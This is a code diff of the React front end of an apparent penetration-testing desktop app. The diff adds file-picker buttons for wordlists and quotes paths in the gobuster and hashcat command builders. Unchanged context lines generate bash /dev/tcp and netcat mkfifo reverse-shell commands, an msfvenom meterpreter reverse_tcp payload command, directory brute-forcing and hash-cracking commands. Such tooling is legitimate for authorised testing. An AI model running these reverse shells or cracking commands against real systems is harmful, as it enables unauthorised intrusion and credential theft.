@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from 'react'
 import { invoke } from '@tauri-apps/api/core'
 import { listen } from '@tauri-apps/api/event'
+import { open as openDialog } from '@tauri-apps/plugin-dialog'
 import { Terminal } from '@xterm/xterm'
 import { FitAddon } from '@xterm/addon-fit'
 import { useScanStore } from '../../core/store/useScanStore'
@@ -118,7 +119,6 @@ export function NetcatTool() {
         </div>
       ) : (
         <div className="flex flex-col h-full bg-slate-900 rounded-lg overflow-hidden border border-slate-700">
-          
           <div className="bg-slate-800 p-2 border-b border-slate-700 flex flex-col gap-2 shrink-0">
             <div className="flex justify-between items-center">
                <div className="flex items-center gap-3">
@@ -156,7 +156,6 @@ export function PayloadsTool() {
   const [rsPort, setRsPort] = useState('4444');
   const [tab, setTab] = useState<'linux' | 'windows' | 'msfvenom'>('linux');
 
-  // MSFVenom State
   const [msfArch, setMsfArch] = useState('x86');
   const [msfPlatform, setMsfPlatform] = useState('windows');
   const [msfFormat, setMsfFormat] = useState('exe');
@@ -169,6 +168,20 @@ export function PayloadsTool() {
 
   const copyToClipboard = (cmd: string) => { navigator.clipboard.writeText(cmd); alert(`Copiado al portapapeles!`); }
 
+  const browseWordlist = async () => {
+    try {
+      const selected = await openDialog({
+        title: 'Seleccionar Wordlist (Diccionario)',
+        filters: [{ name: 'Text Files', extensions: ['txt', 'list', 'csv'] }]
+      });
+      if (selected && !Array.isArray(selected)) {
+        setGoWordlist(selected);
+      }
+    } catch (err) {
+      console.error(err);
+    }
+  };
+
   const getRevShell = (type: string) => {
     if(type === 'bash') return `bash -c 'bash -i >& /dev/tcp/${rsIp}/${rsPort} 0>&1'`;
     if(type === 'nc') return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${rsIp} ${rsPort} >/tmp/f`;
@@ -176,20 +189,18 @@ export function PayloadsTool() {
     return '';
   }
   const getMsfVenom = () => `msfvenom -p ${msfPlatform}/${msfArch}/meterpreter/reverse_tcp LHOST=${rsIp} LPORT=${rsPort} -f ${msfFormat} -o shell.${msfFormat}`;
-  const getGobusterCmd = () => `gobuster dir -u ${goUrl || 'http://target'} -w ${goWordlist} -t 50`;
+  const getGobusterCmd = () => `gobuster dir -u ${goUrl || 'http://target'} -w "${goWordlist}" -t 50`;
   const getSearchsploitCmd = () => `searchsploit ${ssTerm || '<software_version>'}`;
 
   return (
     <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-3 space-y-4">
       
-      {/* TABS DE PAYLOADS */}
       <div className="flex border-b border-slate-200 dark:border-slate-800">
         <button onClick={() => setTab('linux')} className={`pb-1.5 px-3 text-[10px] font-bold uppercase border-b-2 ${tab === 'linux' ? 'border-emerald-500 text-emerald-600 dark:text-emerald-400' : 'border-transparent text-slate-400 hover:text-slate-600'}`}>Linux RS</button>
         <button onClick={() => setTab('windows')} className={`pb-1.5 px-3 text-[10px] font-bold uppercase border-b-2 ${tab === 'windows' ? 'border-blue-500 text-blue-600 dark:text-blue-400' : 'border-transparent text-slate-400 hover:text-slate-600'}`}>Windows RS</button>
         <button onClick={() => setTab('msfvenom')} className={`pb-1.5 px-3 text-[10px] font-bold uppercase border-b-2 ${tab === 'msfvenom' ? 'border-[#0b282c] text-[#0b282c] dark:border-teal-500 dark:text-teal-400' : 'border-transparent text-slate-400 hover:text-slate-600'}`}>MSFVenom</button>
       </div>
 
-      {/* IP / PORT GLOBALES */}
       <div className="flex gap-2">
         <input type="text" value={rsIp} onChange={e => setRsIp(e.target.value)} placeholder="LHOST (Tu IP)" className="flex-1 px-2 py-1.5 bg-slate-50 dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" />
         <input type="text" value={rsPort} onChange={e => setRsPort(e.target.value)} placeholder="LPORT" className="w-20 px-2 py-1.5 bg-slate-50 dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" />
@@ -230,13 +241,16 @@ export function PayloadsTool() {
         <h3 className="text-[10px] tracking-widest font-black text-orange-600 dark:text-orange-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1">Gobuster</h3>
         <input type="text" value={goUrl} onChange={e => setGoUrl(e.target.value)} placeholder="URL: http://target.com" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs dark:text-white outline-none" />
         
-        <input list="wordlists-options" value={goWordlist} onChange={e => setGoWordlist(e.target.value)} placeholder="Ruta a wordlist..." className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none" />
-        <datalist id="wordlists-options">
-          <option value="/usr/share/wordlists/dirb/common.txt" />
-          <option value="/usr/share/wordlists/dirb/big.txt" />
-          <option value="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" />
-          <option value="C:\SecLists\Discovery\Web-Content\raft-large-directories.txt" />
-        </datalist>
+        {/* SELECTOR NATIVO DE WORDLISTS */}
+        <div className="flex gap-1.5">
+          <input list="wordlists-options" value={goWordlist} onChange={e => setGoWordlist(e.target.value)} placeholder="Ruta a wordlist..." className="flex-1 px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none" />
+          <datalist id="wordlists-options">
+            <option value="/usr/share/wordlists/dirb/common.txt" />
+            <option value="/usr/share/wordlists/dirb/big.txt" />
+            <option value="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" />
+          </datalist>
+          <button onClick={browseWordlist} className="px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300 text-[10px] font-bold rounded hover:bg-slate-300 dark:hover:bg-slate-700 transition-colors">Examinar...</button>
+        </div>
 
         <button onClick={() => copyToClipboard(getGobusterCmd())} className="w-full bg-orange-100 text-orange-700 dark:bg-orange-900/30 dark:text-orange-400 px-3 py-1.5 rounded text-xs font-bold hover:bg-orange-200 border border-orange-200 dark:border-orange-800/50 transition-colors">Copiar Comando</button>
       </div>
@@ -255,11 +269,17 @@ export function DecodersTool() {
   const [outputText, setOutputText] = useState('')
   const [detectedType, setDetectedType] = useState('Texto Plano')
   
-  // Hashcat State
   const [hashMode, setHashMode] = useState('0')
   const [hashWordlist, setHashWordlist] = useState('/usr/share/wordlists/rockyou.txt')
 
   const copyToClipboard = (cmd: string) => { navigator.clipboard.writeText(cmd); alert(`Copiado al portapapeles!`); }
+
+  const browseHashWordlist = async () => {
+    try {
+      const selected = await openDialog({ title: 'Seleccionar Wordlist para Hashcat', filters: [{ name: 'Text Files', extensions: ['txt', 'list'] }] });
+      if (selected && !Array.isArray(selected)) setHashWordlist(selected);
+    } catch (err) {}
+  };
 
   const handleJWT = () => {
     try {
@@ -280,7 +300,6 @@ export function DecodersTool() {
     } catch { setOutputText('Error: Entrada inválida.'); }
   }
 
-  // Identificador Automático de Hashes y seteo de HashMode
   useEffect(() => {
     const text = inputText.trim();
     if (!text) { setDetectedType('Texto Plano'); return; }
@@ -316,7 +335,6 @@ export function DecodersTool() {
       
       <textarea value={outputText} readOnly placeholder="Resultado..." className="w-full h-32 p-2 text-[11px] bg-indigo-50 dark:bg-indigo-900/10 border border-indigo-100 dark:border-indigo-900/50 rounded-md outline-none text-indigo-900 dark:text-indigo-300 font-mono resize-none custom-scrollbar shrink-0 mb-4" />
 
-      {/* GENERADOR VISUAL DE HASHCAT */}
       <div className="border-t border-slate-200 dark:border-slate-800 pt-3">
          <h3 className="text-[10px] tracking-widest font-black text-rose-600 dark:text-rose-400 uppercase mb-2">Generador Hashcat</h3>
          <div className="flex gap-2 mb-2">
@@ -332,13 +350,12 @@ export function DecodersTool() {
             </div>
          </div>
          <label className="text-[8px] font-bold text-slate-500 uppercase">Wordlist</label>
-         <input list="hashcat-wordlists" value={hashWordlist} onChange={e => setHashWordlist(e.target.value)} placeholder="Ruta a wordlist..." className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none mb-2" />
-         <datalist id="hashcat-wordlists">
-            <option value="/usr/share/wordlists/rockyou.txt" />
-            <option value="/usr/share/wordlists/fasttrack.txt" />
-         </datalist>
+         <div className="flex gap-1.5 mb-2">
+           <input type="text" value={hashWordlist} onChange={e => setHashWordlist(e.target.value)} placeholder="Ruta a wordlist..." className="flex-1 px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none" />
+           <button onClick={browseHashWordlist} className="px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300 text-[10px] font-bold rounded hover:bg-slate-300 dark:hover:bg-slate-700 transition-colors">Examinar...</button>
+         </div>
 
-         <button onClick={() => copyToClipboard(`hashcat -m ${hashMode} -a 0 hash.txt ${hashWordlist}`)} className="w-full bg-[#0b282c] text-white px-3 py-1.5 rounded text-xs font-bold hover:bg-[#081e21] transition-colors shadow-sm">Copiar Comando Hashcat</button>
+         <button onClick={() => copyToClipboard(`hashcat -m ${hashMode} -a 0 hash.txt "${hashWordlist}"`)} className="w-full bg-[#0b282c] text-white px-3 py-1.5 rounded text-xs font-bold hover:bg-[#081e21] transition-colors shadow-sm">Copiar Comando Hashcat</button>
       </div>
     </div>
   )
